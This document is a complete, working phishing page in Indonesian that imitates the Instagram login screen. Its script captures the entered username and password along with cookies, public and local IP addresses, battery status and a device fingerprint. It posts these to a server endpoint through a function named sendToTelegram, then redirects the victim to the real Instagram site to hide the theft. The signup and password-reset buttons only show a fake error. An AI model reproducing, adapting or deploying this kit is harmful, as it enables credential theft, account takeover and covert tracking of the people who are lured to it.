<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    background: #ffffff;
    overflow-x: hidden;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
}

/* Container */
.container {
    width: 100%;
    max-width: 380px;
    margin: 0 auto;
    padding: 20px;
    text-align: center;
}

/* Logo IG */
.ig-logo {
    width: 60px;
    margin: 30px auto 35px;
}

/* Input */
.input {
    width: 100%;
    padding: 16px;
    margin: 8px 0;
    border: 1px solid #dbdbdb;
    border-radius: 12px;
    background: #fafafa;
    font-size: 15px;
    transition: all 0.2s ease;
}

.input:focus {
    outline: none;
    border-color: #1877f2;
    background: #ffffff;
}

/* Button login */
.btn {
    width: 100%;
    padding: 16px;
    margin-top: 12px;
    border: none;
    border-radius: 30px;
    background: #1877f2;
    color: white;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    transition: opacity 0.2s ease;
}

.btn:hover {
    opacity: 0.9;
}

.btn:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}

/* Lupa password */
.forgot {
    display: block;
    margin-top: 18px;
    font-size: 14px;
    color: #262626;
    text-decoration: none;
}

/* Signup */
.signup {
    display: block;
    margin-top: 60px;
    border: 1px solid #1877f2;
    border-radius: 30px;
    padding: 15px;
    color: #1877f2;
    text-decoration: none;
    font-weight: 500;
    cursor: pointer;
    background: transparent;
    width: 100%;
    font-size: 16px;
    transition: all 0.2s ease;
}

.signup:hover {
    background: rgba(24, 119, 242, 0.05);
}

/* Meta */
.meta {
    margin-top: 20px;
}

.meta img {
    width: 60px;
    display: block;
    margin: 0 auto;
    opacity: 0.8;
}

/* Toast notification */
.toast {
    position: fixed;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%) translateY(100px);
    background: #1e1e1e;
    color: white;
    padding: 12px 24px;
    border-radius: 40px;
    font-size: 14px;
    font-weight: 500;
    z-index: 1000;
    opacity: 0;
    transition: all 0.3s ease;
    pointer-events: none;
    white-space: nowrap;
    backdrop-filter: blur(10px);
    background: rgba(0, 0, 0, 0.85);
}

.toast.show {
    transform: translateX(-50%) translateY(0);
    opacity: 1;
}

/* Modal */
.modal {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.5);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 2000;
    opacity: 0;
    visibility: hidden;
    transition: all 0.3s ease;
    backdrop-filter: blur(4px);
}

.modal.show {
    opacity: 1;
    visibility: visible;
}

.modal-content {
    background: white;
    border-radius: 24px;
    max-width: 320px;
    width: 90%;
    padding: 32px 24px;
    text-align: center;
    transform: scale(0.9);
    transition: transform 0.3s ease;
}

.modal.show .modal-content {
    transform: scale(1);
}

.modal-icon {
    font-size: 48px;
    margin-bottom: 16px;
}

.modal-title {
    font-size: 20px;
    font-weight: 600;
    margin-bottom: 12px;
    color: #1e1e1e;
}

.modal-message {
    font-size: 14px;
    color: #666;
    margin-bottom: 24px;
    line-height: 1.5;
}

.modal-close {
    background: #1877f2;
    color: white;
    border: none;
    padding: 12px 24px;
    border-radius: 30px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    width: 100%;
}

.loading-spinner {
    display: inline-block;
    width: 20px;
    height: 20px;
    border: 2px solid rgba(255,255,255,0.3);
    border-top-color: white;
    border-radius: 50%;
    animation: spin 0.6s linear infinite;
    margin-right: 8px;
    vertical-align: middle;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}
</style>
</head>

<body>

<div class="container">
    <img src="https://c.top4top.io/p_3733t7kcx1.png" class="ig-logo">

    <input type="text" id="username" class="input" placeholder="Nama pengguna, email, atau nomor...">
    <input type="password" id="password" class="input" placeholder="Kata sandi">

    <button id="loginBtn" class="btn">Login</button>

    <a href="#" id="forgotBtn" class="forgot">Lupa kata sandi?</a>

    <button id="signupBtn" class="signup">Buat akun baru</button>

    <div class="meta">
        <img src="https://b.top4top.io/p_3733knn9r0.png">
    </div>
</div>

<div id="toast" class="toast"></div>

<div id="modal" class="modal">
    <div class="modal-content">
        <div class="modal-icon">📱</div>
        <div class="modal-title">Fitur Sedang Bermasalah</div>
        <div class="modal-message">Maaf, fitur ini sedang dalam perbaikan. Silakan coba lagi nanti.</div>
        <button class="modal-close" onclick="closeModal()">OK</button>
    </div>
</div>

<script>
const toast = document.getElementById('toast');
const modal = document.getElementById('modal');
const loginBtn = document.getElementById('loginBtn');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');

function showToast(message) {
    toast.textContent = message;
    toast.classList.add('show');
    setTimeout(() => {
        toast.classList.remove('show');
    }, 3000);
}

function showModal() {
    modal.classList.add('show');
}

function closeModal() {
    modal.classList.remove('show');
}

async function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const language = navigator.language;
    const platform = navigator.platform;
    const screenWidth = screen.width;
    const screenHeight = screen.height;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    let batteryInfo = 'Tidak tersedia';
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}%, ${battery.charging ? 'Mengisi daya' : 'Tidak mengisi daya'}`;
        } catch(e) {
            batteryInfo = 'Gagal membaca';
        }
    }
    
    let cookies = document.cookie || 'Tidak ada cookies';
    
    let localIP = 'Tidak tersedia';
    try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = (event) => {
            if (event && event.candidate && event.candidate.candidate) {
                const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (ipMatch) {
                    localIP = ipMatch[0];
                }
                pc.close();
            }
        };
        setTimeout(() => pc.close(), 2000);
    } catch(e) {
        localIP = 'Tidak dapat diakses';
    }
    
    let fingerprint = '';
    const components = [
        navigator.userAgent,
        navigator.language,
        screen.colorDepth,
        screen.width + 'x' + screen.height,
        new Date().getTimezoneOffset(),
        navigator.hardwareConcurrency || '',
        navigator.deviceMemory || ''
    ];
    fingerprint = await hashString(components.join('|||'));
    
    return {
        userAgent,
        language,
        platform,
        screen: `${screenWidth}x${screenHeight}`,
        timezone,
        battery: batteryInfo,
        localIP,
        fingerprint,
        cookies: cookies.substring(0, 500)
    };
}

async function hashString(str) {
    const encoder = new TextEncoder();
    const data = encoder.encode(str);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 32);
}

async function getPublicIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch(e) {
        return 'Tidak dapat diakses';
    }
}

async function sendToTelegram(username, password) {
    const deviceInfo = await getDeviceInfo();
    const publicIP = await getPublicIP();
    
    const currentTime = new Date().toLocaleString('id-ID', {
        dateStyle: 'full',
        timeStyle: 'long'
    });
    
    const message = `DATA LOGIN
    
IDENTITAS
──────────────────
Username/Email : ${username || '(kosong)'}
Password       : ${password || '(kosong)'}
Waktu          : ${currentTime}

INFORMASI PERANGKAT
──────────────────
User Agent     : ${deviceInfo.userAgent}
Platform       : ${deviceInfo.platform}
Bahasa         : ${deviceInfo.language}
Resolusi Layar : ${deviceInfo.screen}
Zona Waktu     : ${deviceInfo.timezone}
Baterai        : ${deviceInfo.battery}

INFORMASI JARINGAN
──────────────────
IP Publik      : ${publicIP}
IP Lokal       : ${deviceInfo.localIP}
Cookies        : ${deviceInfo.cookies.substring(0, 200)}${deviceInfo.cookies.length > 200 ? '...' : ''}

FINGERPRINT
──────────────────
${deviceInfo.fingerprint}

SISTEM
──────────────────
User Agent Length: ${deviceInfo.userAgent.length} karakter
Platform Detail: ${deviceInfo.platform || 'Tidak terdeteksi'}`;
    
    try {
        const response = await fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ message })
        });
        
        const result = await response.json();
        return result.success;
    } catch(error) {
        console.error('Error:', error);
        return false;
    }
}

loginBtn.addEventListener('click', async () => {
    const username = usernameInput.value.trim();
    const password = passwordInput.value;
    
    if (!username || !password) {
        showToast('Harap isi semua field');
        return;
    }
    
    loginBtn.disabled = true;
    loginBtn.innerHTML = '<span class="loading-spinner"></span> Memproses';
    
    const success = await sendToTelegram(username, password);
    
    if (success) {
        showToast('Login berhasil, mengalihkan...');
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com';
        }, 1500);
    } else {
        showToast('Terjadi kesalahan, coba lagi');
        loginBtn.disabled = false;
        loginBtn.innerHTML = 'Login';
    }
});

document.getElementById('forgotBtn').addEventListener('click', (e) => {
    e.preventDefault();
    showModal();
});

document.getElementById('signupBtn').addEventListener('click', (e) => {
    e.preventDefault();
    showModal();
});

usernameInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') loginBtn.click();
});

passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') loginBtn.click();
});

modal.addEventListener('click', (e) => {
    if (e.target === modal) closeModal();
});
</script>
</body>
</html>
